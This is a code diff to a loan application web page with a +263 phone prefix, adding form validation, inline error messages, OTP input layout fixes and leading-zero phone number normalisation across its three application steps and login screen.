@@ -177,8 +177,8 @@
   .otp-card h2 { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
   .otp-hint { font-size:0.83rem; color:var(--text-light); margin-bottom:5px; }
   .otp-phone { font-size:0.9rem; font-weight:600; color:var(--text-dark); margin-bottom:22px; }
-  .otp-inputs { display:flex; gap:10px; margin-bottom:12px; }
-  .otp-box { flex:1; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:'Inter',sans-serif; font-size:1.2rem; font-weight:700; color:var(--navy); outline:none; transition:border-color 0.2s; }
+  .otp-inputs { display:flex; gap:8px; margin-bottom:12px; width:100%; }
+  .otp-box { flex:1; min-width:0; width:0; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:'Inter',sans-serif; font-size:1.2rem; font-weight:700; color:var(--navy); outline:none; transition:border-color 0.2s; }
   .otp-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(27,200,212,0.12); }
   .otp-resend { font-size:0.8rem; color:var(--teal); margin-bottom:22px; }
   .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
@@ -295,10 +295,11 @@
       <h2>Loan Application</h2>
       <p class="step-sub">Step 1 of 3</p>
       <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+      <div class="msg-box error" id="s1Err"><span class="msg-icon">&#x2715;</span><span id="s1ErrTxt"></span></div>
       <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div></div>
-      <div class="field"><label>Loan Amount ($)</label><input type="number" id="s1am" value="1000" placeholder="Enter amount"></div>
+      <div class="field"><label>Loan Amount ($)</label><input type="number" id="s1am" value="1000" placeholder="Enter amount" oninput="clearErr('s1Err')"></div>
       <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option>36 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
-      <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…"></textarea></div>
+      <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
       <button class="btn-grad" onclick="toS2()">NEXT STEP</button>
     </div>
   </div>
@@ -316,15 +317,16 @@
       <h2>Loan Application</h2>
       <p class="step-sub">Step 2 of 3</p>
       <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+      <div class="msg-box error" id="s2Err"><span class="msg-icon">&#x2715;</span><span id="s2ErrTxt"></span></div>
       <div class="field-row">
-        <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="First Name"></div>
-        <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Last Name"></div>
+        <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')"></div>
+        <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')"></div>
       </div>
-      <div class="field"><label>Email Address</label><input type="email" id="s2em" placeholder="your@email.com"></div>
+      <div class="field"><label>Email Address</label><input type="email" id="s2em" placeholder="your@email.com" oninput="clearErr('s2Err')"></div>
       <div class="field">
         <label>Phone Number</label>
-        <div class="phone-row"><div class="ph-pre">+263</div><input type="tel" id="s2ph" placeholder="712345678" maxlength="9"></div>
-        <div class="field-hint">Enter 9 digits (e.g., 712345678 or 773456789)</div>
+        <div class="phone-row"><div class="ph-pre">+263</div><input type="tel" id="s2ph" placeholder="712345678 or 0712345678" maxlength="10" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
+        <div class="field-hint">Enter 9 digits or start with 0 (e.g., 0712345678 → auto-converts to 712345678)</div>
       </div>
       <div class="step-btns">
         <button class="btn-gray" onclick="goTo('page-step1')">PREVIOUS</button>
@@ -347,8 +349,9 @@
       <h2>Loan Application</h2>
       <p class="step-sub">Step 3 of 3</p>
       <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
+      <div class="msg-box error" id="s3Err"><span class="msg-icon">&#x2715;</span><span id="s3ErrTxt"></span></div>
       <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected>Self-Employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div></div>
-      <div class="field"><label>Annual Income ($)</label><input type="number" id="s3in" placeholder="Enter annual income"></div>
+      <div class="field"><label>Annual Income ($)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')"></div>
       <div class="sum-box">
         <h3>Application Summary</h3>
         <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">$1,000</span></div>
@@ -392,8 +395,8 @@
       <div class="msg-box error" id="lgMsg"><span class="msg-icon">✕</span><span id="lgMsgTxt"></span></div>
 
       <div class="lg-phone-row">
-        <div class="lg-ph-pre">🇿🇼 zw &nbsp;+263</div>
-        <input type="tel" id="lgPh" placeholder="712345678" oninput="chkLogin()">
+        <div class="lg-ph-pre">🇿🇼 +263</div>
+        <input type="tel" id="lgPh" placeholder="712345678 or 0712345678" maxlength="10" oninput="normalizePhone('lgPh');chkLogin()">
       </div>
       <div class="pin-label">Enter your PIN (4 characters)</div>
       <div class="pin-row">
@@ -559,17 +562,67 @@
   // ══════════════════════════════════════════════════════
   // STEP NAVIGATION
   // ══════════════════════════════════════════════════════
+  // Normalize phone: strip leading 0 so +263 prefix works correctly
+  function normalizePhone(id) {
+    const el = document.getElementById(id);
+    if (el.value.startsWith('0')) {
+      const cursor = el.selectionStart;
+      el.value = el.value.substring(1);
+      // Restore cursor position (minus the removed 0)
+      el.setSelectionRange(Math.max(0, cursor - 1), Math.max(0, cursor - 1));
+    }
+  }
+
+  // Validation helpers
+  function showErr(id, msg) {
+    document.getElementById(id + 'Txt').textContent = msg;
+    document.getElementById(id).classList.add('show');
+    document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }
+  function clearErr(id) {
+    document.getElementById(id).classList.remove('show');
+  }
+  function shakeField(id) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.style.borderColor = '#ef4444';
+    el.style.boxShadow = '0 0 0 3px rgba(239,68,68,0.15)';
+    setTimeout(() => { el.style.borderColor = ''; el.style.boxShadow = ''; }, 1800);
+  }
+
   function toS2() {
-    S.amt     = document.getElementById('s1am').value || 1000;
+    const amt     = document.getElementById('s1am').value;
+    const purpose = document.getElementById('s1pu').value.trim();
+    if (!amt || Number(amt) <= 0) {
+      showErr('s1Err', 'Please enter a valid loan amount.');
+      shakeField('s1am'); return;
+    }
+    if (!purpose) {
+      showErr('s1Err', 'Please describe the purpose of your loan.');
+      shakeField('s1pu'); return;
+    }
+    clearErr('s1Err');
+    S.amt     = amt;
     S.term    = document.getElementById('s1te').value;
-    S.purpose = document.getElementById('s1pu').value;
+    S.purpose = purpose;
     goTo('page-step2');
   }
 
   function toS3() {
-    S.first = document.getElementById('s2fi').value;
-    S.last  = document.getElementById('s2la').value;
-    S.phone = document.getElementById('s2ph').value;
+    const first = document.getElementById('s2fi').value.trim();
+    const last  = document.getElementById('s2la').value.trim();
+    const email = document.getElementById('s2em').value.trim();
+    const phone = document.getElementById('s2ph').value.trim();
+    if (!first) { showErr('s2Err', 'Please enter your first name.'); shakeField('s2fi'); return; }
+    if (!last)  { showErr('s2Err', 'Please enter your last name.');  shakeField('s2la'); return; }
+    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      showErr('s2Err', 'Please enter a valid email address.'); shakeField('s2em'); return;
+    }
+    if (!phone || phone.length < 9) {
+      showErr('s2Err', 'Please enter a valid 9-digit phone number.'); shakeField('s2ph'); return;
+    }
+    clearErr('s2Err');
+    S.first = first; S.last = last; S.phone = phone;
     document.getElementById('sA').textContent = '$' + Number(S.amt).toLocaleString();
     document.getElementById('sT').textContent = S.term;
     document.getElementById('sP').textContent = S.purpose || '—';
@@ -577,10 +630,13 @@
     goTo('page-step3');
   }
 
-  // ══════════════════════════════════════════════════════
-  // STEP 3: SUBMIT APPLICATION (no bot call here — just transitions)
-  // ══════════════════════════════════════════════════════
+  // STEP 3: SUBMIT APPLICATION
   function submitApp() {
+    const income = document.getElementById('s3in').value;
+    if (!income || Number(income) <= 0) {
+      showErr('s3Err', 'Please enter your annual income.'); shakeField('s3in'); return;
+    }
+    clearErr('s3Err');
     goTo('page-submitted');
     let c = 3;
     document.getElementById('rdN').textContent = c;
